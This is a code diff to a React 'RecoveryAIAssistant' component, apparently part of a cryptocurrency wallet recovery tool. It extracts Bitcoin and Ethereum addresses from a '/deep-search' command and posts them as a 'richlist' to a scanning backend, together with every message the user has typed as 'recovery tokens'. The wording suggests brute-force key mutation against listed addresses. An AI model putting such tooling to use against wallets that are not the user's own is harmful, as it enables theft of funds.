@@ -76,13 +76,36 @@ export function RecoveryAIAssistant() {
     } else if (input.toLowerCase().startsWith('/deep-search')) {
         setIsDeepSearchEnabled(true);
         const query = input.replace('/deep-search', '').trim();
+
+        // Extract potential addresses from query
+        const addressRegex = /(?:0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[ac-hj-np-z02-9]{8,87})/g;
+        const foundAddresses = query.match(addressRegex) || [];
+
         setMessages(prev => [...prev, {
             type: 'ai',
-            text: `DEEP_SEARCH_ARMED: Exhaustive mutation engine active. Ingesting session intelligence... ${query ? `Target: ${query}` : ''}`,
+            text: `DEEP_SEARCH_ARMED: Exhaustive mutation engine active. ${foundAddresses.length > 0 ? `Targeting ${foundAddresses.length} addresses. ` : ''}Ingesting session intelligence...`,
             time: new Date()
         }]);
-        // Trigger scan automatically if not running
-        if (!isScannerRunning) {
+
+        // If addresses found, add them to richlist via API
+        if (foundAddresses.length > 0) {
+            try {
+                await fetch(getApiUrl('/scan/start'), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        paths: ['.'],
+                        richlist: foundAddresses.join(','),
+                        deep_scan: true,
+                        recovery_tokens: messages
+                            .filter(m => m.type === 'user')
+                            .map(m => m.text)
+                            .concat([query])
+                    }),
+                });
+                setIsScannerRunning(true);
+            } catch (err) { console.error(err); }
+        } else if (!isScannerRunning) {
             setTimeout(() => toggleScanner(true), 500);
         }
     } else if (input.toLowerCase() === 'start mixhunter') {
